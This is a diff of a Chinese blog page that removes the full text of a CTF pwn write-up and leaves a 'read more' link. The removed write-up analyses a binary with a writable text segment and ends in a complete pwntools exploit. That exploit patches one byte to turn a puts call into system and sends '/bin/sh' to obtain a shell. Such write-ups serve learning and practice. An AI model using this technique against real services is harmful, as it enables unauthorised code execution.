@@ -342,7 +342,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-06-07 13:01:28 / 修改时间：13:59:25" itemprop="dateCreated datePublished" datetime="2021-06-07T13:01:28+08:00">2021-06-07</time>
+      <time title="创建时间：2021-06-07 13:01:28 / 修改时间：14:01:01" itemprop="dateCreated datePublished" datetime="2021-06-07T13:01:28+08:00">2021-06-07</time>
     </span>
 
   
@@ -356,51 +356,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="pwn-text段可改"><a href="#pwn-text段可改" class="headerlink" title="pwn-text段可改"></a>pwn-text段可改</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>记一次线下赛遇到的text段可改的奇奇怪怪的pwn题</p>
-<h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>程序初始化时就遇到一个没见过的函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(&amp;dword_8048000, <span class="number">0x8888</span>u, <span class="number">7</span>);</span><br></pre></td></tr></table></figure>
-
-<p>mprotect函数改变源程序    0x8048000到0x8048000+0x8888   的属性，参数为7表明 <strong>可读可写可执行</strong></p>
-<p>在没有开启pie保护的前提下，表明<strong>原程序代码段可修改</strong></p>
-<p>main函数主要内容：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">buf_1 = <span class="number">0</span>;</span><br><span class="line">buf_2 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try use a bullet to pwn this%s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf_1);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf_1, <span class="number">5u</span>);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">int</span>)buf_1 &gt; (<span class="keyword">int</span>)<span class="string">&quot;ou launch the bullet, and... What&#x27;s your name?%c\n&quot;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p is too big...\n&quot;</span>, buf_1);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">*buf_1 = buf_2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK,you launch the bullet, and... What&#x27;s your name?%c\n&quot;</span>, SHIBYTE(v5));</span><br><span class="line">read(<span class="number">0</span>, &amp;buf_1, <span class="number">0xA</span>u);</span><br><span class="line"><span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf_1);</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>(int)&quot;ou launch the bullet, and... What&#39;s your name?%c\n&quot;</code>为该字符串的地址，为：0x08048888</p>
-<p>即在buf_1输入一个地址，该地址如果小于等于0x08048888，即把buf_2的内容写入该地址，同时把buf_1的内容作为puts的参数输出</p>
-<p>其中buf_1和buf_2都在栈上，这里当时在做题时快结束了才注意到这题为32位程序，栈上为4个字节，故第一次read buf_1时可以溢出一个字节到栈下一个参数 buf_2, 使buf_2可控。</p>
-<p><strong>即可以控制源程序从 0x8048000 到 0x08048888 的任意一个字节。</strong></p>
-<h2 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h2><p>做出这题还有点半蒙半猜的性质，还是赛后整理学习的时候整明白整个过程的</p>
-<p>主要思路就是修改程序text段的一个字节，使最后调用puts改成调用system，然后输入buf_1为 /bin/sh 运行shell，修改puts为system就是利用栈上溢出一个字节个往地址中写 buf_1中的地址写一个字节buf_2。</p>
-<p>具体看关键的汇编：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048774 ; 25:   read(0, &amp;buf_1, 0xAu);</span><br><span class="line">.text:08048774                 add     esp, 10h</span><br><span class="line">.text:08048777                 sub     esp, 4</span><br><span class="line">.text:0804877A                 push    0Ah             ; nbytes</span><br><span class="line">.text:0804877C                 lea     eax, [ebp+buf_1]</span><br><span class="line">.text:0804877F                 push    eax             ; buf</span><br><span class="line">.text:08048780                 push    0               ; fd</span><br><span class="line">.text:08048782                 call    _read</span><br><span class="line">.text:08048787 ; 26:   puts((const char *)&amp;buf_1);</span><br><span class="line">.text:08048787                 add     esp, 10h</span><br><span class="line">.text:0804878A                 sub     esp, 0Ch</span><br><span class="line">.text:0804878D                 lea     eax, [ebp+buf_1]</span><br><span class="line">.text:08048790                 push    eax             ; s</span><br><span class="line">.text:08048791                 call    _puts</span><br><span class="line">.text:08048796                 add     esp, 10h</span><br><span class="line">.text:08048799                 mov     eax, 0</span><br><span class="line">.text:0804879E                 mov     ecx, [ebp+var_C]</span><br><span class="line">.text:080487A1                 xor     ecx, large gs:14h</span><br><span class="line">.text:080487A8                 jz      short loc_80487AF</span><br><span class="line">.text:080487AA                 call    ___stack_chk_fail</span><br><span class="line">.text:080487AF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080487AF ; 27:   return 0;</span><br></pre></td></tr></table></figure>
-
-<p>即我们需要修该<code> .text:08048787 ; 26:   puts((const char *)&amp;buf_1);</code>的调用puts，改为调用system。</p>
-<p>第一个read读入5个字节，前4个字节在buf_1里，要修改的地址，第5个字节在buf_2里，使要修改成的内容。</p>
-<p>为了修改最后一次运行的puts为system，我们第一次read前四个字节为<code>call  &lt;puts@plt&gt;</code>的地址</p>
-<p>我们的目标为把<code>call  &lt;puts@plt&gt;</code>修改为<code>call  &lt;system@plt&gt;</code>，这里就要看call函数的16进制表示：</p>
-<p><img src="https://pic.imgdb.cn/item/60bdaf6e844ef46bb24d793c.png"></p>
-<p>即 call _puts对应的汇编为 <code>E8 3A FD FF FF</code>.</p>
-<p>学习之后知道E8代表call 后面的  3A FD FF FF  为小端序的偏移，该偏移是基于call指令下一条指令与call函数调用的plt的函数地址的偏移，在32位程序中，小端序的 3A FD FF FF 为负数，即往上跳到puts的plt表。</p>
-<p>小端序 3A FD FF FF 转化为16进制为0xFFFFFD3A , 转化为10进制为 -710 ，call的下一条指令为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:08048796                 add     esp, 10h</span><br></pre></td></tr></table></figure>
-
-<p>而<strong>0x08048796 +  0xFFFFFD3A = 0x80484D0</strong></p>
-<p><img src="https://pic.imgdb.cn/item/60bdb277844ef46bb289edda.png"></p>
-<p>而0x80484D0正好是<strong>puts@plt</strong>的地址说明计算是正确的</p>
-<p>我们的目标就修改为<strong>system@plt</strong>，即修改为0x80484E0，计算偏移：</p>
-<p><strong>0x80484E0 - 0x08048796 = 0xFFFFFD4A</strong></p>
-<p>即我们需要修改16进制汇编为 <strong>E8 4A FD FF FF</strong>,且原汇编为<strong>E8 3A FD FF FF</strong></p>
-<p>正好相差一个字节，我们需要修改原来的3A为4A即可</p>
-<p>由于原汇编的地址也就是call的地址是：0x08048791，修改call的第二个字节的地址则为0x08048792.</p>
-<p>到这里两次read的内容就明确了：</p>
-<p>第一次read ： p32(0x08048792)+p8(4A)</p>
-<p>第二次read ： ‘/bin/sh’</p>
-<p>即可修改第二次puts为system(“/bin/sh”);得到shell</p>
-<p>也可以直接在ida里patch查看修改后的效果：</p>
-<p><img src="https://pic.imgdb.cn/item/60bdb4b5844ef46bb2b65e94.png"></p>
-<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;118.190.62.234&quot;, &quot;12435&quot;)</span></span><br><span class="line"></span><br><span class="line">payload1 = p32(<span class="number">0x08048792</span>)+p8(<span class="number">0x4A</span>)<span class="comment">#修改puts为system</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;pwn this\n&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#填入system参数</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>还是对汇编和汇编的16进制的表示不太熟悉，线下做题的时候对原函数的反汇编还是没有理解太清楚，程序运行过程还有些模糊。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/07/pwn-text%E6%AE%B5%E5%8F%AF%E6%94%B9/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
